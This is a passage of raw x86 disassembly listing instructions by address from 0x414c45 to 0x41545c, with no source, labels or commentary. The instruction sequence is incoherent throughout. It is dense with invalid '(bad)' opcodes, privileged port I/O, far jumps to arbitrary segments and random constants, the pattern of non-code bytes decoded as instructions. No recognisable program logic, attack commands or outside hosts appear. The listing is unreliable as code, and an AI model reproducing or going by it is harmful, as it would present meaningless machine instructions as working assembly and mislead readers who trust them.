  414c45:	sub    BYTE PTR ds:0x862c0e67,dl
  414c4b:	(bad)  
  414c4c:	stos   BYTE PTR es:[edi],al
  414c4d:	push   ecx
  414c4e:	xchg   ecx,eax
  414c4f:	out    dx,al
  414c50:	mov    gs,WORD PTR [edx]
  414c52:	shr    DWORD PTR [edi],1
  414c54:	daa    
  414c55:	out    dx,al
  414c56:	pop    edx
  414c57:	and    BYTE PTR [eax],ah
  414c59:	adc    ebp,DWORD PTR ss:[edx+0x551a585]
  414c60:	xor    bh,BYTE PTR [edx-0x2a]
  414c63:	out    0x60,al
  414c65:	jmp    DWORD PTR ds:0x48c88817
  414c6b:	fisttp WORD PTR [ebx+0x2d]
  414c6e:	inc    edx
  414c6f:	in     eax,dx
  414c70:	push   ecx
  414c71:	cld    
  414c72:	jno    0x414cac
  414c74:	inc    ecx
  414c75:	int    0xd1
  414c77:	push   esi
  414c78:	jnp    0x414c8f
  414c7a:	(bad)  
  414c7c:	jb     0x414ced
  414c7e:	stc    
  414c7f:	repnz repz sbb DWORD PTR [edx+0x16e46f83],edx
  414c87:	pop    edi
  414c88:	and    edi,ebp
  414c8a:	dec    BYTE PTR [eax]
  414c8c:	(bad)  
  414c8d:	lahf   
  414c8e:	inc    ebx
  414c8f:	mov    cl,0x20
  414c91:	inc    eax
  414c92:	and    BYTE PTR [ebp-0x9],0x68
  414c96:	out    0x62,al
  414c98:	hlt    
  414c99:	mov    edi,0xb5fe6077
  414c9e:	pop    ecx
  414c9f:	and    al,BYTE PTR [ecx]
  414ca1:	inc    DWORD PTR [ecx-0x22]
  414ca4:	sahf   
  414ca5:	pop    es
  414ca6:	iret   
  414ca7:	jbe    0xd77fd670
  414cad:	inc    edx
  414cae:	jmp    0xca9b:0x2c7003a5
  414cb5:	in     al,dx
  414cb6:	jnp    0x414c69
  414cb8:	cmp    eax,0x19a27fba
  414cbd:	dec    esp
  414cbe:	mov    edx,0x604377f5
  414cc3:	and    al,0x85
  414cc5:	jmp    ebp
  414cc7:	(bad)  
  414cc8:	sub    al,0x8a
  414cca:	scas   al,BYTE PTR es:[edi]
  414ccb:	mov    ebx,0xdf2d64c2
  414cd0:	xchg   bh,bh
  414cd2:	dec    esp
  414cd3:	sar    ebx,0xbd
  414cd6:	in     eax,0xc7
  414cd8:	mov    WORD PTR [esi-0x75bfacab],?
  414cde:	fs test al,0x1d
  414ce1:	les    eax,FWORD PTR [edx]
  414ce3:	fnstenv [esi-0x66]
  414ce6:	add    ecx,esi
  414ce8:	cdq    
  414ce9:	or     bh,bh
  414ceb:	cwde   
  414cec:	xchg   DWORD PTR [edx+0x60],edi
  414cef:	mov    ds:0xb66b430b,al
  414cf4:	out    dx,eax
  414cf5:	cmp    edx,esi
  414cf7:	jne    0x414ce1
  414cf9:	in     al,0x2a
  414cfb:	dec    ebp
  414cfc:	xchg   BYTE PTR [esp+edi*8-0x75b91a4f],bl
  414d03:	dec    edx
  414d04:	repz js 0x414d4b
  414d07:	xchg   esi,eax
  414d08:	shl    BYTE PTR [edi-0x603b84a7],cl
  414d0e:	mov    esp,0xbc323e55
  414d13:	dec    eax
  414d14:	dec    edx
  414d15:	hlt    
  414d16:	push   eax
  414d17:	stc    
  414d18:	clc    
  414d19:	scas   eax,DWORD PTR es:[edi]
  414d1a:	mov    ebp,0xa4fc4c24
  414d1f:	inc    ebp
  414d20:	mov    edx,0xaa8a0322
  414d25:	pop    ss
  414d26:	push   es
  414d27:	mov    edx,0x2230b578
  414d2c:	fs cwde 
  414d2e:	and    eax,0xa65cd67
  414d33:	jne    0x414cde
  414d35:	xchg   BYTE PTR [edi-0x785bb60d],dl
  414d3b:	fmul   st(7),st
  414d3d:	add    al,0x16
  414d3f:	xor    DWORD PTR [edi],0x22
  414d42:	jmp    0x82c33591
  414d47:	adc    eax,0xa13909a3
  414d4c:	dec    edi
  414d4d:	sbb    al,0x66
  414d4f:	xor    BYTE PTR [eax+0xe],al
  414d52:	or     DWORD PTR [ebx+0x6b76f05e],0xffffffe7
  414d59:	add    al,0xbb
  414d5b:	fisub  DWORD PTR [eax]
  414d5d:	mov    dl,0x51
  414d5f:	or     al,0x18
  414d61:	jmp    0x414d97
  414d63:	mov    ds:0x1d62d5be,al
  414d68:	lahf   
  414d69:	icebp  
  414d6a:	push   ebx
  414d6b:	cli    
  414d6c:	out    0xcb,eax
  414d6e:	xchg   ecx,eax
  414d6f:	adc    DWORD PTR [edi+0x5],esi
  414d72:	shr    DWORD PTR [ecx-0xd],cl
  414d75:	sub    eax,0x71613338
  414d7a:	pushf  
  414d7b:	std    
  414d7c:	pop    edx
  414d7d:	inc    ebx
  414d7e:	or     BYTE PTR [edx],ah
  414d80:	(bad)  
  414d81:	into   
  414d82:	sub    BYTE PTR [esi+0x4e],al
  414d85:	mov    edi,0x82e12c82
  414d8a:	mov    BYTE PTR [ecx+0x4aa479b2],bh
  414d90:	cmp    ebp,DWORD PTR [edx+edi*4+0x70]
  414d94:	xor    DWORD PTR [eax],0x58cd9c49
  414d9a:	sbb    eax,0xab15f805
  414d9f:	push   ebp
  414da0:	push   ebx
  414da1:	in     eax,dx
  414da2:	or     esi,0x154f77bd
  414da8:	pop    esp
  414da9:	iret   
  414daa:	and    BYTE PTR [ebx-0x5920cd31],dh
  414db0:	(bad)  
  414db1:	(bad)  [ebp-0x5a228a56]
  414db7:	cs in  eax,0x4f
  414dba:	jmp    0x64e5:0xfe0a79cb
  414dc1:	test   al,0x8
  414dc3:	int    0xc5
  414dc5:	inc    edi
  414dc6:	popa   
  414dc7:	aaa    
  414dc8:	popa   
  414dc9:	stos   BYTE PTR es:[edi],al
  414dca:	mov    dh,0xb5
  414dcc:	jp     0x414dd7
  414dce:	dec    ebp
  414dcf:	aas    
  414dd0:	xchg   edx,eax
  414dd1:	or     al,ch
  414dd3:	pop    edi
  414dd4:	mov    ch,0x58
  414dd6:	jno    0x414e51
  414dd8:	and    cl,BYTE PTR [edi]
  414dda:	push   ss
  414ddb:	psrlw  mm7,QWORD PTR [esi]
  414dde:	and    cl,bh
  414de0:	in     eax,0xef
  414de2:	mov    ah,0xde
  414de4:	lock xchg edx,eax
  414de6:	jo     0x414ddd
  414de8:	ffreep st(7)
  414dea:	pop    ss
  414deb:	jmp    0x414da8
  414ded:	or     BYTE PTR [edi-0xcb1c173],bl
  414df3:	push   edx
  414df4:	montmul (bad)
  414df5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414df6:	xchg   dh,bh
  414df8:	pop    ss
  414df9:	sbb    DWORD PTR [edi+0x34bf0f2a],0x72bd9264
  414e03:	ret    
  414e04:	scas   al,BYTE PTR es:[edi]
  414e05:	dec    ecx
  414e06:	rcr    DWORD PTR [ebp+0x1c1e871a],cl
  414e0c:	mov    dh,0x87
  414e0e:	pop    edi
  414e0f:	xchg   ecx,eax
  414e10:	xchg   esi,eax
  414e11:	retf   0xb886
  414e14:	call   0x8ca0bd65
  414e19:	rcr    edi,0x5
  414e1c:	jge    0x414e70
  414e1e:	or     DWORD PTR [esi+0x1a],edi
  414e21:	(bad)  
  414e22:	mov    DWORD PTR [eax],ebx
  414e24:	in     al,dx
  414e25:	cmp    al,0x6b
  414e27:	in     al,0x9d
  414e29:	push   ds
  414e2a:	inc    ecx
  414e2b:	pop    ss
  414e2c:	inc    edi
  414e2d:	faddp  st(1),st
  414e2f:	lea    edi,[ebp-0x78df4c98]
  414e35:	mov    al,ds:0x8e9c1103
  414e3a:	aad    0x4
  414e3c:	clc    
  414e3d:	std    
  414e3e:	and    al,0xd1
  414e40:	call   0x11d9:0x6bb1fc75
  414e47:	adc    eax,0x31b37ea5
  414e4c:	adc    eax,0x7fcd6de9
  414e51:	dec    ebx
  414e52:	loop   0x414e2b
  414e54:	out    dx,eax
  414e55:	mov    ch,al
  414e57:	mov    DWORD PTR [ecx-0x30],edi
  414e5a:	lods   eax,DWORD PTR ds:[esi]
  414e5b:	icebp  
  414e5c:	inc    edx
  414e5d:	imul   ecx,DWORD PTR cs:[edx-0x6a9e2d31],0xba7e958
  414e68:	dec    esp
  414e69:	mov    bl,al
  414e6b:	adc    DWORD PTR [ebp-0x47a997ca],edi
  414e71:	cmp    DWORD PTR [ebp-0x28bbabb1],ebx
  414e77:	lods   al,BYTE PTR ds:[esi]
  414e78:	sub    bh,BYTE PTR [edx]
  414e7a:	sbb    eax,0xcd714cc6
  414e7f:	icebp  
  414e80:	cmp    al,BYTE PTR [eax-0x7f]
  414e83:	mov    dl,0x5c
  414e85:	enter  0x309,0x32
  414e89:	add    ebx,edx
  414e8b:	add    eax,0xbb48f24d
  414e90:	add    eax,0xcb1cb199
  414e95:	(bad)  
  414e96:	retf   
  414e97:	cmp    al,0xa0
  414e99:	loop   0x414ea2
  414e9b:	repz sbb BYTE PTR [ecx],dl
  414e9e:	mov    dh,0x4b
  414ea0:	hlt    
  414ea1:	fldenv [ebx-0x7]
  414ea4:	sbb    eax,0x8393f14e
  414ea9:	push   es
  414eaa:	xchg   ebp,eax
  414eab:	into   
  414eac:	and    eax,0x54347768
  414eb1:	pop    ds
  414eb2:	push   0xffffffc1
  414eb4:	dec    eax
  414eb5:	lea    esi,[ebx]
  414eb7:	(bad)  
  414eb8:	mov    ds:0xe87b78e7,al
  414ebd:	bnd jnp 0x414f16
  414ec0:	mov    DWORD PTR [ecx-0x73],edi
  414ec3:	int    0x9e
  414ec5:	push   eax
  414ec6:	sbb    BYTE PTR [ebp+0x45],cl
  414ec9:	xchg   esp,eax
  414eca:	sbb    bh,BYTE PTR [edi+0x23]
  414ecd:	in     al,dx
  414ece:	out    0x0,eax
  414ed0:	adc    DWORD PTR [ebp-0x6d59f493],ecx
  414ed6:	pop    ebx
  414ed7:	mov    ebx,0x15103067
  414edc:	lahf   
  414edd:	xchg   edx,eax
  414ede:	mov    ds:0x1de11f2a,eax
  414ee3:	push   esp
  414ee4:	inc    ecx
  414ee5:	out    0xbf,al
  414ee7:	sahf   
  414ee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ee9:	popf   
  414eea:	cmp    al,0x39
  414eec:	mov    ebp,0xc3170013
  414ef1:	or     DWORD PTR [ebp+0x5b870c00],0xffffffce
  414ef8:	(bad)  
  414ef9:	rcr    ecx,cl
  414efb:	aaa    
  414efc:	loope  0x414f76
  414efe:	aas    
  414eff:	adc    esi,DWORD PTR [eax+0x61]
  414f02:	mov    dh,BYTE PTR [esi+0x28]
  414f05:	aam    0x8
  414f07:	aas    
  414f08:	pop    eax
  414f09:	sbb    eax,0x8e618c2
  414f0e:	test   DWORD PTR [ecx],esi
  414f10:	xsha1  (bad)
  414f11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f12:	dec    esi
  414f13:	push   es
  414f14:	jmp    0x52e1ceb9
  414f19:	inc    esp
  414f1a:	in     al,dx
  414f1b:	pop    esp
  414f1c:	icebp  
  414f1d:	dec    esp
  414f1e:	mov    eax,ds:0xca43deaf
  414f23:	jno    0x414f33
  414f25:	push   ebx
  414f26:	add    esp,ebp
  414f28:	jno    0x414ecf
  414f2a:	push   0xd59d2c21
  414f2f:	jge    0x414f5d
  414f31:	or     al,0xdf
  414f34:	mov    es,WORD PTR [ebx+esi*2-0x29]
  414f38:	stos   DWORD PTR es:[edi],eax
  414f39:	fadd   DWORD PTR [esi+ecx*4-0x43]
  414f3d:	cmp    ch,0xd0
  414f40:	mov    esi,0x23f9c84a
  414f45:	mov    WORD PTR [eax+0x1b],?
  414f48:	push   0x57719ba6
  414f4d:	xchg   BYTE PTR [ebx+0x2a],dl
  414f50:	jmp    DWORD PTR [ebx-0x3ad766a]
  414f56:	cdq    
  414f57:	ror    BYTE PTR [ebp-0x610bf492],cl
  414f5d:	mov    eax,ds:0x2625ee7d
  414f62:	call   0xfa6c:0x75b7464f
  414f69:	frstor [edx-0x5ebaa16e]
  414f6f:	ret    0xffc8
  414f72:	cmp    al,0xc
  414f74:	or     dh,BYTE PTR [ebx-0xf]
  414f77:	mov    ah,0xec
  414f79:	mov    eax,0xe41609b6
  414f7e:	add    bh,BYTE PTR [ebx]
  414f80:	and    eax,0x8204fa2c
  414f85:	call   0x2e3b:0xd0f2df73
  414f8c:	dec    eax
  414f8d:	cdq    
  414f8e:	or     edi,DWORD PTR [ecx]
  414f90:	or     bh,cl
  414f92:	int    0xa7
  414f94:	mov    ds:0x163299e1,eax
  414f99:	sub    cl,bl
  414f9b:	shl    DWORD PTR [esi-0x240af4ec],1
  414fa1:	fisttp DWORD PTR [esi+0x69]
  414fa4:	ror    BYTE PTR fs:[ebp-0x4fa0bbaa],0xe3
  414fac:	jmp    0xc3887d9
  414fb1:	iret   
  414fb2:	loop   0x414f6e
  414fb4:	and    dl,BYTE PTR [ebx-0x32473186]
  414fba:	jmp    DWORD PTR ds:0xd2261654
  414fc0:	mov    edi,0xdc7dafcc
  414fc5:	in     al,0x6a
  414fc7:	push   DWORD PTR [ebp-0x14]
  414fca:	inc    edx
  414fcb:	mov    dl,BYTE PTR [edi-0xd]
  414fce:	add    ecx,DWORD PTR [ebx]
  414fd0:	mov    al,ds:0x618f686a
  414fd5:	mov    ebx,DWORD PTR [esi+0x62]
  414fd8:	arpl   WORD PTR [edx+edi*1+0x5a],sp
  414fdc:	dec    ebp
  414fdd:	ds jb  0x414ff7
  414fe0:	and    ah,bl
  414fe2:	cmpps  xmm6,XMMWORD PTR [ecx-0x1f961c10],0x79
  414fea:	sbb    ecx,ebx
  414fec:	lea    ecx,[esp+ebp*1]
  414fef:	or     al,0x64
  414ff1:	fnsave [ebx-0xf9269e3]
  414ff7:	and    ebx,DWORD PTR [edx+0x50712d53]
  414ffd:	jnp    0x414ff0
  414fff:	mov    al,0xdd
  415001:	(bad)  
  415002:	jge    0x414fbe
  415004:	push   esi
  415005:	inc    ebx
  415006:	into   
  415007:	aaa    
  415008:	mov    bh,0xd9
  41500a:	jbe    0x415025
  41500c:	or     DWORD PTR es:[ebx],0xe87e0959
  415013:	inc    ecx
  415014:	inc    DWORD PTR [esi+edx*2]
  415017:	loopne 0x414fdb
  415019:	ss push ss
  41501b:	xor    eax,0x756519e4
  415020:	mov    edi,DWORD PTR [ebp+0x3b073d1c]
  415026:	cmp    DWORD PTR [edi],ecx
  415028:	ror    DWORD PTR [esi-0x5ad2524d],1
  41502e:	pop    ebp
  41502f:	sub    ebp,edx
  415031:	ja     0x415097
  415033:	(bad)  
  415034:	push   eax
  415035:	xor    dh,cl
  415037:	dec    edx
  415038:	or     ah,dl
  41503a:	mov    ecx,0x16d5f98e
  41503f:	jl     0x414fea
  415041:	inc    eax
  415042:	cmp    ecx,edx
  415044:	push   edi
  415045:	or     edi,DWORD PTR [eax]
  415047:	cmp    al,0xe7
  415049:	test   al,0x10
  41504b:	out    dx,eax
  41504c:	xchg   esi,eax
  41504d:	add    esi,0x50
  415050:	dec    esp
  415051:	xchg   esi,eax
  415052:	mov    bl,0x8
  415054:	jnp    0x4150d0
  415056:	mov    ebx,0x89633c4e
  41505b:	or     edi,DWORD PTR [ebp+0x3f]
  41505e:	pop    ds
  41505f:	ror    BYTE PTR [esi+0x72821643],cl
  415065:	inc    ebp
  415066:	out    dx,eax
  415067:	add    ch,dl
  415069:	test   DWORD PTR ds:0xbd79e2f2,0x1c14be1e
  415073:	fwait
  415074:	or     dl,BYTE PTR [ecx-0x2c7624d7]
  41507a:	leave  
  41507b:	pop    esi
  41507c:	inc    edx
  41507d:	mov    esp,0x435ddb39
  415082:	or     eax,0x126900ac
  415087:	das    
  415088:	in     al,0x70
  41508a:	pop    edx
  41508b:	sbb    BYTE PTR [ecx-0x466c8d52],dl
  415091:	adc    ah,BYTE PTR [ecx]
  415093:	pop    ebp
  415094:	push   ecx
  415095:	xchg   edx,eax
  415096:	mov    cl,0x5c
  415098:	mov    dh,0x6a
  41509a:	mov    dl,0x4b
  41509c:	push   ds
  41509d:	pop    esp
  41509e:	jge    0x4150b0
  4150a0:	jne    0x415088
  4150a2:	mov    dl,0x67
  4150a4:	mov    ecx,0x6c274007
  4150a9:	cmc    
  4150aa:	sub    esp,DWORD PTR [edx]
  4150ac:	dec    esi
  4150ad:	in     eax,dx
  4150ae:	dec    ebp
  4150af:	jl     0x41509e
  4150b1:	jo     0x415129
  4150b3:	xchg   edx,eax
  4150b4:	xchg   BYTE PTR [ebx-0x21],bl
  4150b7:	hlt    
  4150b8:	jg     0x415073
  4150ba:	test   DWORD PTR [eax+0x63],esi
  4150bd:	test   al,0x11
  4150bf:	mov    eax,0x20ae9edc
  4150c4:	stos   BYTE PTR es:[edi],al
  4150c5:	rcr    BYTE PTR [eax],1
  4150c7:	mov    ds:0x14ad8919,eax
  4150cc:	in     al,dx
  4150cd:	mov    cl,0x42
  4150cf:	stos   BYTE PTR es:[edi],al
  4150d0:	out    0xdc,al
  4150d2:	jnp    0x415107
  4150d4:	cld    
  4150d5:	mov    edi,0xca6c2ee0
  4150da:	lods   eax,DWORD PTR ds:[esi]
  4150db:	push   0x1dea4799
  4150e0:	jmp    0x101f7534
  4150e5:	sbb    edi,DWORD PTR [esi]
  4150e7:	and    DWORD PTR [esi+0x7e],ebp
  4150ea:	mov    esi,0xe770be0a
  4150ef:	(bad)  
  4150f0:	icebp  
  4150f1:	inc    edi
  4150f2:	cmp    esp,0xffffffcd
  4150f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150f6:	fistp  WORD PTR [edx-0x4fa4f264]
  4150fc:	sub    al,0x5d
  4150fe:	(bad)  es:[edi]
  415101:	mov    bh,0x51
  415103:	mov    ecx,0xae760f48
  415108:	das    
  415109:	outs   dx,DWORD PTR ds:[esi]
  41510a:	fisttp QWORD PTR ds:0xf3f9e687
  415110:	call   0x4f38:0x59560a3f
  415117:	cwde   
  415118:	and    BYTE PTR [edi],bl
  41511a:	out    dx,al
  41511b:	js     0x41514c
  41511d:	lods   al,BYTE PTR ds:[esi]
  41511e:	enter  0xd69e,0xab
  415122:	pop    eax
  415123:	xchg   ebx,eax
  415124:	dec    edx
  415125:	pusha  
  415126:	adc    BYTE PTR [eax+ebp*2],al
  415129:	sbb    bl,0x9c
  41512c:	push   esi
  41512d:	int3   
  41512e:	mov    ecx,0xfb0e1d98
  415133:	mov    al,ds:0xd2f5f09b
  415138:	inc    esi
  415139:	push   eax
  41513a:	mov    ds:0x8b364407,al
  41513f:	pop    ds
  415140:	and    BYTE PTR [edx-0x395f4657],0x7b
  415147:	sti    
  415148:	xchg   esi,eax
  415149:	cmp    DWORD PTR [edi-0x1c],edx
  41514c:	push   ecx
  41514d:	or     ah,cl
  41514f:	iret   
  415150:	inc    esi
  415151:	sub    eax,DWORD PTR [ebp+0x4af9a916]
  415157:	popa   
  415158:	repz (bad) 
  41515a:	jl     0x41510c
  41515c:	ds push esi
  41515e:	or     al,0xae
  415160:	sti    
  415161:	pushf  
  415162:	xchg   ecx,eax
  415163:	loope  0x415192
  415165:	popa   
  415166:	adc    DWORD PTR [ebx-0x197c3938],edx
  41516c:	cld    
  41516d:	jns    0x415168
  41516f:	dec    edi
  415170:	mov    dh,0x17
  415172:	shld   DWORD PTR [edi+0x78064221],ebx,cl
  415179:	ds es mov al,dh
  41517d:	icebp  
  41517e:	mov    ah,cl
  415180:	cmp    eax,0x6da0afc2
  415185:	jmp    FWORD PTR [eax]
  415187:	inc    edx
  415188:	in     al,0x8e
  41518a:	add    DWORD PTR [eax+0x2e],0x7f
  41518e:	addr16 or eax,0x61fff14
  415194:	adc    al,0x7c
  415196:	mov    BYTE PTR [edx+0x335e1e6a],dl
  41519c:	pop    eax
  41519d:	aas    
  41519e:	nop    DWORD PTR [edx+0x11]
  4151a2:	jecxz  0x41512e
  4151a4:	ret    0xd39e
  4151a7:	push   bp
  4151a9:	push   es
  4151aa:	dec    esp
  4151ab:	mov    eax,DWORD PTR [ecx]
  4151ad:	push   es
  4151ae:	add    edx,DWORD PTR [edx+0x27d51c]
  4151b4:	and    BYTE PTR [ebx+0x25],bh
  4151b7:	adc    eax,0x7a73df92
  4151bc:	pop    edx
  4151bd:	or     al,BYTE PTR [esi+0x1069cd9f]
  4151c3:	cwde   
  4151c4:	test   eax,0x353d9c61
  4151c9:	cmp    eax,0x2d4cd308
  4151ce:	mov    esi,0x737e23f5
  4151d3:	pop    ebp
  4151d4:	xor    eax,0x721af54f
  4151d9:	int    0xa4
  4151db:	daa    
  4151dc:	aaa    
  4151dd:	addr16 inc ecx
  4151df:	or     BYTE PTR [eax],ah
  4151e1:	es (bad) 
  4151e3:	sbb    eax,0x2842cb74
  4151e8:	inc    esi
  4151e9:	ror    DWORD PTR [esp+ebx*4],1
  4151ec:	in     eax,0x70
  4151ee:	ins    BYTE PTR es:[edi],dx
  4151ef:	pop    eax
  4151f0:	inc    ecx
  4151f1:	lods   al,BYTE PTR ds:[esi]
  4151f2:	dec    ebp
  4151f3:	mov    edi,DWORD PTR [esi+0x2b17d74d]
  4151f9:	shl    DWORD PTR [ebx],1
  4151fb:	push   0x4a6fbc4
  415200:	and    al,0x90
  415202:	and    BYTE PTR ds:0x55a8b0d9,cl
  415208:	repnz pop esp
  41520a:	and    ebp,ebp
  41520c:	std    
  41520d:	test   bl,ch
  41520f:	mov    edi,0x16e5ab5f
  415214:	or     DWORD PTR [esi],ecx
  415216:	mov    cl,0x4e
  415218:	mov    cl,0x7a
  41521a:	or     al,0xe9
  41521c:	mov    edx,0x898bfccf
  415221:	pop    ebx
  415222:	jl     0x415267
  415224:	sbb    al,0x35
  415226:	cmc    
  415227:	xchg   edx,eax
  415228:	inc    edi
  415229:	adc    ebx,DWORD PTR [ecx+0xa3f8463]
  41522f:	popa   
  415230:	xchg   BYTE PTR [edx+0x6d5455a1],al
  415236:	cs push ds
  415238:	scas   eax,DWORD PTR es:[edi]
  415239:	push   0x59
  41523b:	in     eax,0xa6
  41523d:	xor    esi,DWORD PTR [ebp-0x44b63c84]
  415243:	test   ebx,edi
  415245:	les    ebx,FWORD PTR ss:[esi]
  415248:	test   al,0xd6
  41524a:	in     al,0x4c
  41524c:	sbb    al,0x6f
  41524e:	aaa    
  41524f:	sbb    eax,0xd59d6af8
  415254:	xor    eax,0x238e17df
  415259:	sahf   
  41525a:	adc    al,0x69
  41525c:	mov    dh,0x76
  41525e:	mov    esi,0xcd7602fe
  415263:	stos   DWORD PTR es:[edi],eax
  415264:	xchg   esi,eax
  415265:	call   0xd7ae0b6b
  41526a:	add    bl,cl
  41526c:	jbe    0x415246
  41526e:	mov    edi,0x2ded36ec
  415273:	std    
  415274:	xchg   esi,eax
  415275:	inc    edi
  415276:	int    0xec
  415278:	out    0xd0,al
  41527a:	lea    edi,[ecx+0x30]
  41527d:	into   
  41527e:	inc    ebx
  41527f:	jmp    0xde14:0xea42d65c
  415286:	xchg   bl,ah
  415288:	or     dl,ch
  41528a:	shl    DWORD PTR [esi],0x44
  41528d:	cli    
  41528e:	mov    edi,0xc7867222
  415293:	sbb    eax,0xeb0f5d47
  415298:	out    0xc3,al
  41529a:	int3   
  41529b:	xchg   esi,eax
  41529c:	adc    DWORD PTR [esi-0x66e83326],ecx
  4152a2:	push   0x988c26af
  4152a7:	gs scas eax,DWORD PTR es:[edi]
  4152a9:	loope  0x4152eb
  4152ab:	into   
  4152ac:	xchg   esi,eax
  4152ad:	jo     0x415325
  4152af:	pop    ss
  4152b0:	pusha  
  4152b1:	ds cmp DWORD PTR cs:[eax+0x10],ecx
  4152b6:	jg     0x415334
  4152b8:	pushf  
  4152b9:	mov    BYTE PTR [ebx-0xe3e2ce4],cl
  4152bf:	aas    
  4152c0:	sbb    BYTE PTR [eax+esi*4+0x5b3ad85a],ah
  4152c7:	or     esi,DWORD PTR [edx+0x46981550]
  4152cd:	jo     0x41531e
  4152cf:	add    ch,0xcb
  4152d2:	gs add dh,ah
  4152d5:	(bad)  
  4152d6:	cld    
  4152d7:	arpl   di,sp
  4152d9:	mov    ds:0x9dc1455e,al
  4152de:	adc    al,BYTE PTR fs:[edi]
  4152e1:	ins    DWORD PTR es:[edi],dx
  4152e2:	xor    eax,0x3c8f662a
  4152e7:	(bad)  
  4152e8:	xchg   edx,eax
  4152e9:	loop   0x415303
  4152eb:	pop    ecx
  4152ec:	test   eax,0xdea14a2c
  4152f1:	or     DWORD PTR [edi],ecx
  4152f3:	in     eax,0x67
  4152f5:	and    ah,BYTE PTR [eax+0x7f]
  4152f8:	(bad)  
  4152fa:	jp     0x415297
  4152fc:	fst    DWORD PTR [eax]
  4152fe:	jle    0x4152c9
  415300:	mov    esi,0xe2184cdc
  415305:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415307:	ret    0x5964
  41530a:	add    al,0xc6
  41530c:	pusha  
  41530d:	add    BYTE PTR [edx-0x35],cl
  415310:	mov    dh,0x33
  415312:	mov    ebx,0xbc0fb905
  415317:	pop    eax
  415318:	cmp    eax,0x10ce0396
  41531d:	mov    eax,ds:0xf867d50f
  415322:	rcl    ebx,1
  415324:	pushf  
  415325:	jg     0x4152cf
  415327:	loope  0x415314
  415329:	bound  esp,QWORD PTR [ecx+0x26491a19]
  41532f:	sar    DWORD PTR [ecx],cl
  415331:	xchg   edi,eax
  415332:	jp     0x4153b1
  415334:	std    
  415335:	fsubr  DWORD PTR [edi]
  415337:	push   esp
  415338:	jl     0x4152bc
  41533a:	cmc    
  41533b:	int    0x72
  41533d:	out    dx,eax
  41533e:	push   0xfffffff1
  415340:	arpl   WORD PTR [ebx+0x33],ax
  415343:	push   ecx
  415344:	jne    0x415334
  415346:	test   cl,bl
  415348:	sbb    ecx,edx
  41534a:	or     al,0x8d
  41534c:	add    BYTE PTR [ebp+0x50],cl
  41534f:	jle    0x4152e5
  415351:	cld    
  415352:	int3   
  415353:	pop    es
  415354:	call   0x1a9f:0xfd4fe0a7
  41535b:	xor    al,0xae
  41535d:	fstp   DWORD PTR [edx+ecx*2+0x188d7630]
  415364:	fcomip st,st(2)
  415366:	cmp    ch,cl
  415368:	jecxz  0x415388
  41536a:	inc    ebp
  41536b:	pop    esp
  41536c:	adc    bh,BYTE PTR [edx]
  41536e:	mov    ah,0x22
  415370:	cmp    BYTE PTR [edi],bh
  415372:	in     eax,0xe4
  415374:	neg    BYTE PTR [eax-0x10]
  415377:	cs xchg edi,eax
  415379:	int    0x6a
  41537b:	cli    
  41537c:	lahf   
  41537d:	pop    ebp
  41537e:	jmp    0xe4f8:0x40065669
  415385:	add    esp,DWORD PTR [edx]
  415387:	fsubr  st(0),st
  415389:	inc    esi
  41538a:	stos   BYTE PTR es:[edi],al
  41538b:	popa   
  41538c:	pop    esi
  41538d:	xlat   BYTE PTR ds:[ebx]
  41538e:	icebp  
  41538f:	mov    ah,0x5d
  415391:	enter  0x650d,0xfd
  415395:	and    DWORD PTR [edx-0x53],edx
  415398:	adc    ebp,DWORD PTR [edx]
  41539a:	(bad)  
  41539b:	jb     0x41540a
  41539d:	xor    BYTE PTR [eax-0x10b30d4b],dl
  4153a3:	aaa    
  4153a4:	add    dl,cl
  4153a6:	mov    ecx,ebx
  4153a8:	repz adc DWORD PTR [ecx+0x45ec2062],0x7eb7cea3
  4153b3:	dec    edx
  4153b4:	xlat   BYTE PTR ds:[ebx]
  4153b5:	cmp    al,0xe8
  4153b7:	inc    eax
  4153b8:	out    0xbe,eax
  4153ba:	mov    ds:0x4b660606,al
  4153bf:	xchg   DWORD PTR [ebp+0x29],edx
  4153c2:	dec    edx
  4153c3:	xlat   BYTE PTR ds:[ebx]
  4153c4:	ins    DWORD PTR es:[edi],dx
  4153c5:	loop   0x41538f
  4153c7:	pop    esp
  4153c8:	mov    esp,0xc73181fb
  4153cd:	daa    
  4153ce:	data16 aad 0xb0
  4153d1:	cs dec edx
  4153d3:	fwait
  4153d4:	push   0xfa7b49f0
  4153d9:	jo     0x41541f
  4153db:	mov    edx,ebx
  4153dd:	popf   
  4153de:	das    
  4153df:	jo     0x415429
  4153e1:	test   eax,0x692382b0
  4153e6:	xchg   DWORD PTR [ecx],esi
  4153e8:	adc    edi,DWORD PTR ds:0x71157166
  4153ee:	fwait
  4153ef:	xor    eax,0x724bf237
  4153f4:	push   ds
  4153f5:	sub    bl,bl
  4153f7:	mov    bh,0x31
  4153f9:	pop    ebp
  4153fa:	in     eax,0x11
  4153fc:	mov    edi,0xeaebfabe
  415401:	and    dl,BYTE PTR [eax]
  415403:	pop    ebx
  415404:	and    eax,DWORD PTR [ecx+eax*1+0x53]
  415408:	pop    ecx
  415409:	jns    0x41543f
  41540b:	stos   BYTE PTR es:[edi],al
  41540c:	dec    edi
  41540d:	je     0x415484
  41540f:	leave  
  415410:	outs   dx,BYTE PTR ds:[esi]
  415411:	ja     0x4153f5
  415413:	das    
  415414:	lea    edx,[edi]
  415416:	push   0x266e8138
  41541b:	pop    esi
  41541c:	loopne 0x4153a4
  41541e:	sar    al,cl
  415420:	test   DWORD PTR [ebp-0x6c],ebp
  415423:	test   BYTE PTR [esi],dh
  415425:	out    dx,al
  415426:	xchg   ecx,eax
  415427:	mov    dh,0x28
  415429:	jae    0x4153f7
  41542b:	sbb    edx,DWORD PTR [eax+0x5f220137]
  415431:	popa   
  415432:	fwait
  415433:	call   0x70d9b0f8
  415438:	out    dx,eax
  415439:	hlt    
  41543a:	and    al,0xa3
  41543c:	xchg   edi,eax
  41543d:	lahf   
  41543e:	jb     0x415482
  415440:	jns    0x4153c9
  415442:	imul   ebx,DWORD PTR [ecx+0x41],0x49df9007
  415449:	xor    DWORD PTR [eax+0x6786fe5e],ebp
  41544f:	and    al,0x5
  415451:	lahf   
  415452:	push   cs
  415453:	pop    ecx
  415454:	push   0x53b429d7
  415459:	outs   dx,DWORD PTR ds:[esi]
  41545a:	cmp    al,0xc0
  41545c:	inc    edi
